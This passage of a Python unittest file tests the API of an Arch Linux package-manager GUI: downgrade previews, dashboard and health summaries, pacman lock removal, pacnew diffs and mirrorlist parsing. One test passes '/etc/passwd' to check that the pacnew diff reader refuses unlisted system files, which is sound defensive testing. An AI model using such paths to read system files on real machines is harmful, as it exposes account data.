        self.assertEqual('error', self.api.get_update_preview('nope:nope')['status'])


class DowngradePreviewTest(unittest.TestCase):
    """get_downgrade_preview: advisory rollback warnings (target chosen by the gem later)."""

    def setUp(self):
        self.manager = Mock()
        self.api = AtlasApi(self.manager, Mock())

    def _pkg(self, name='vim', ptype='arch_repo', repository='extra'):
        p = Mock()
        p.name = name
        p.get_type.return_value = ptype
        p.gem_name = 'arch'
        p.repository = repository
        p.id = None
        p.version = '9.1'
        return p

    def test_advisory_warning_and_notes(self):
        pkg = self._pkg()
        self.api._get_pkg = Mock(return_value=pkg)
        d = self.api.get_downgrade_preview('arch_repo:vim')['data']
        self.assertEqual('downgrade', d['action'])
        self.assertEqual('9.1', d['version'])
        self.assertTrue(any(w['level'] == 'warn' for w in d['warnings']))
        self.assertTrue(any('roll back to next' in n.lower() for n in d['notes']))

    def test_aur_mentions_rebuild(self):
        pkg = self._pkg(name='yay', ptype='aur', repository='aur')
        self.api._get_pkg = Mock(return_value=pkg)
        d = self.api.get_downgrade_preview('aur:yay')['data']
        self.assertTrue(any('rebuild' in n.lower() for n in d['notes']))

    def test_unknown_pkg_id_errors(self):
        self.api._get_pkg = Mock(return_value=None)
        self.assertEqual('error', self.api.get_downgrade_preview('nope:nope')['status'])


class DashboardSummaryTest(unittest.TestCase):
    """get_dashboard_summary: cheap, concurrent, fail-open 'attention center' signals."""

    def setUp(self):
        self.manager = Mock()
        self.manager.managers = []
        self.api = AtlasApi(self.manager, Mock())

    def test_aggregates_all_sections(self):
        from datetime import datetime, timezone, timedelta
        synced = datetime.now(timezone.utc) - timedelta(hours=5)
        with patch.object(self.api, 'get_pacnew_files', return_value={'status': 'ok', 'data': {'count': 3}}), \
             patch.object(self.api, '_last_db_sync_time', return_value=synced), \
             patch.object(self.api, 'check_upgrade_news', return_value={'status': 'ok', 'data': {'new_count': 2}}), \
             patch.object(self.api, 'get_cleanup_summary', return_value={'status': 'ok', 'data': {
                 'orphans': {'count': 4},
                 'pacman_cache': {'available': True, 'total_human': '1.2 GB'},
                 'flatpak': {'available': True}}}), \
             patch.object(self.api, 'get_activity', return_value={'status': 'ok', 'data': [
                 {'action': 'install', 'pkg_name': 'a'}, {'action': 'update', 'pkg_name': 'b'},
                 {'action': 'uninstall', 'pkg_name': 'c'}, {'action': 'install', 'pkg_name': 'd'}]}), \
             patch('os.path.exists', return_value=False):
            res = self.api.get_dashboard_summary()

        self.assertEqual('ok', res['status'])
        d = res['data']
        self.assertEqual(3, d['safety']['pacnew_count'])
        self.assertEqual(2, d['safety']['news_count'])
        self.assertFalse(d['safety']['pacman_locked'])
        self.assertAlmostEqual(5.0, d['safety']['db_sync_age_hours'], delta=0.2)
        self.assertEqual(4, d['reclaim']['orphans'])
        self.assertEqual('1.2 GB', d['reclaim']['cache_human'])
        self.assertTrue(d['reclaim']['flatpak_available'])
        self.assertEqual(3, len(d['activity']))  # capped at 3, newest-first preserved
        self.assertIn('user', d)  # name for the greeting (string or None)

    def test_fails_open_per_section(self):
        # a sub-check raising must not break the summary — that field degrades to None/default
        with patch.object(self.api, 'get_pacnew_files', side_effect=RuntimeError('boom')), \
             patch.object(self.api, '_last_db_sync_time', return_value=None), \
             patch.object(self.api, 'check_upgrade_news', side_effect=RuntimeError('boom')), \
             patch.object(self.api, 'get_cleanup_summary', side_effect=RuntimeError('boom')), \
             patch.object(self.api, 'get_activity', side_effect=RuntimeError('boom')):
            res = self.api.get_dashboard_summary()

        self.assertEqual('ok', res['status'])
        d = res['data']
        self.assertIsNone(d['safety']['pacnew_count'])
        self.assertIsNone(d['safety']['db_sync_age_hours'])
        self.assertIsNone(d['reclaim']['orphans'])
        self.assertEqual([], d['activity'])

    def test_reads_aur_chroot_state(self):
        arch = Mock()
        arch.__module__ = 'atlas.gems.arch.controller'
        arch.configman.get_config.return_value = {'aur_build_chroot': True}
        self.manager.managers = [arch]
        with patch.object(self.api, 'get_pacnew_files', return_value={'status': 'ok', 'data': {'count': 0}}), \
             patch.object(self.api, '_last_db_sync_time', return_value=None), \
             patch.object(self.api, 'check_upgrade_news', return_value={'status': 'ok', 'data': {'new_count': 0}}), \
             patch.object(self.api, 'get_cleanup_summary', return_value={'status': 'ok', 'data': {}}), \
             patch.object(self.api, 'get_activity', return_value={'status': 'ok', 'data': []}):
            res = self.api.get_dashboard_summary()
        self.assertTrue(res['data']['aur']['chroot_enabled'])


class SystemHealthTest(unittest.TestCase):
    """get_system_health: cheap, concurrent, fail-open Arch-cockpit checks."""

    def setUp(self):
        self.manager = Mock()
        self.manager.managers = []
        self.api = AtlasApi(self.manager, Mock())

    def test_aggregates_checks(self):
        from datetime import datetime, timezone, timedelta
        synced = datetime.now(timezone.utc) - timedelta(hours=30)
        with patch.object(self.api, '_last_db_sync_time', return_value=synced), \
             patch.object(self.api, '_mirror_regen_cmd', return_value=['reflector', '--save']), \
             patch.object(self.api, 'get_pacnew_files', return_value={'status': 'ok', 'data': {'count': 2}}), \
             patch.object(self.api, 'get_cleanup_summary', return_value={'status': 'ok', 'data': {
                 'orphans': {'count': 5},
                 'pacman_cache': {'available': True, 'total_human': '3.0 GB'},
                 'flatpak': {'available': True}}}), \
             patch('os.path.exists', return_value=True):
            res = self.api.get_system_health()

        self.assertEqual('ok', res['status'])
        d = res['data']
        self.assertAlmostEqual(30.0, d['db_sync']['age_hours'], delta=0.2)
        self.assertEqual('reflector', d['mirrors']['tool'])
        self.assertTrue(d['lock']['locked'])
        self.assertEqual(2, d['pacnew']['count'])
        self.assertEqual(5, d['orphans']['count'])
        self.assertEqual('3.0 GB', d['cache']['human'])
        self.assertTrue(d['flatpak']['unused_available'])

    def test_fails_open(self):
        with patch.object(self.api, '_last_db_sync_time', side_effect=RuntimeError('boom')), \
             patch.object(self.api, '_mirror_regen_cmd', side_effect=RuntimeError('boom')), \
             patch.object(self.api, 'get_pacnew_files', side_effect=RuntimeError('boom')), \
             patch.object(self.api, 'get_cleanup_summary', side_effect=RuntimeError('boom')):
            res = self.api.get_system_health()
        self.assertEqual('ok', res['status'])
        d = res['data']
        self.assertIsNone(d['db_sync']['age_hours'])
        self.assertIsNone(d['mirrors']['tool'])
        self.assertIsNone(d['pacnew']['count'])
        self.assertIsNone(d['orphans']['count'])

    def test_reads_chroot(self):
        arch = Mock()
        arch.__module__ = 'atlas.gems.arch.controller'
        arch.configman.get_config.return_value = {'aur_build_chroot': True}
        self.manager.managers = [arch]
        with patch.object(self.api, '_last_db_sync_time', return_value=None), \
             patch.object(self.api, '_mirror_regen_cmd', return_value=None), \
             patch.object(self.api, 'get_pacnew_files', return_value={'status': 'ok', 'data': {'count': 0}}), \
             patch.object(self.api, 'get_cleanup_summary', return_value={'status': 'ok', 'data': {}}):
            res = self.api.get_system_health()
        self.assertTrue(res['data']['chroot']['enabled'])

    def test_remove_pacman_lock_no_lock(self):
        with patch('os.path.exists', return_value=False):
            res = self.api.remove_pacman_lock()
        self.assertEqual('ok', res['status'])
        self.assertFalse(res['removed'])

    def test_remove_pacman_lock_refuses_when_pacman_running(self):
        with patch('os.path.exists', return_value=True), \
             patch('atlas.view.webview.api.run_cmd', return_value='12345\n'):
            res = self.api.remove_pacman_lock()
        self.assertEqual('error', res['status'])
        self.assertIn('running', res['message'].lower())

    def test_remove_pacman_lock_removes_when_idle(self):
        proc = Mock(); proc.communicate.return_value = (b'', b''); proc.returncode = 0
        with patch('os.path.exists', return_value=True), \
             patch('atlas.view.webview.api.run_cmd', return_value=''), \
             patch.object(self.api, 'ensure_root_password', return_value='pw'), \
             patch.object(self.api, '_notify'), \
             patch('atlas.view.webview.api.new_root_subprocess', return_value=proc) as nrs:
            res = self.api.remove_pacman_lock()
        self.assertEqual('ok', res['status'])
        self.assertTrue(res['removed'])
        nrs.assert_called_once()

    def test_refresh_aur_index_calls_gem(self):
        arch = Mock(); arch.__module__ = 'atlas.gems.arch.controller'
        self.manager.managers = [arch]
        res = self.api.refresh_aur_index()
        self.assertEqual('ok', res['status'])
        arch._update_aur_index.assert_called_once()


class PacnewMirrorTest(unittest.TestCase):
    """get_pacnew_diff (whitelisted, read-only) + get_mirror_status (parsing)."""

    def setUp(self):
        self.api = AtlasApi(Mock(), Mock())

    def test_pacnew_diff_rejects_unlisted_path(self):
        with patch.object(self.api, 'get_pacnew_files', return_value={'status': 'ok', 'data': {'files': []}}):
            res = self.api.get_pacnew_diff('/etc/passwd')  # not a .pacnew, not listed
        self.assertEqual('error', res['status'])

    def test_pacnew_diff_real(self):
        import tempfile, os
        d = tempfile.mkdtemp()
        base = os.path.join(d, 'foo.conf')
        new = base + '.pacnew'
        with open(base, 'w') as f: f.write('a=1\nb=2\n')
        with open(new, 'w') as f: f.write('a=1\nb=3\n')
        with patch.object(self.api, 'get_pacnew_files', return_value={'status': 'ok', 'data': {'files': [new]}}):
            res = self.api.get_pacnew_diff(new)
        self.assertEqual('ok', res['status'])
        self.assertTrue(res['data']['readable'])
        self.assertIn('-b=2', res['data']['diff'])
        self.assertIn('+b=3', res['data']['diff'])

    def test_pacnew_diff_missing_base_not_readable(self):
        import tempfile, os
        d = tempfile.mkdtemp()
        new = os.path.join(d, 'gone.conf.pacnew')
        with open(new, 'w') as f: f.write('x\n')   # base 'gone.conf' does not exist
        with patch.object(self.api, 'get_pacnew_files', return_value={'status': 'ok', 'data': {'files': [new]}}):
            res = self.api.get_pacnew_diff(new)
        self.assertEqual('ok', res['status'])
        self.assertFalse(res['data']['readable'])

    def test_mirror_status_parses_active_servers(self):
        import tempfile, os
        fd, p = tempfile.mkstemp(); os.close(fd)
        with open(p, 'w') as f:
            f.write('# Commented\n#Server = https://commented.example/$repo\n'
                    'Server = https://a.example.org/archlinux/$repo/os/$arch\n'
                    'Server = https://b.example.net/$repo\n')
        with patch.object(AtlasApi, 'MIRRORLIST_PATH', p), \
             patch.object(self.api, '_mirror_regen_cmd', return_value=['reflector', '--save', '/x']):
            d = self.api.get_mirror_status()['data']
        self.assertEqual(2, d['count'])  # only the two uncommented Server lines
        self.assertEqual(['a.example.org', 'b.example.net'], d['servers'])
        self.assertEqual('reflector', d['tool'])
        self.assertIn('reflector', d['command'])
        self.assertIsNotNone(d['last_modified_iso'])
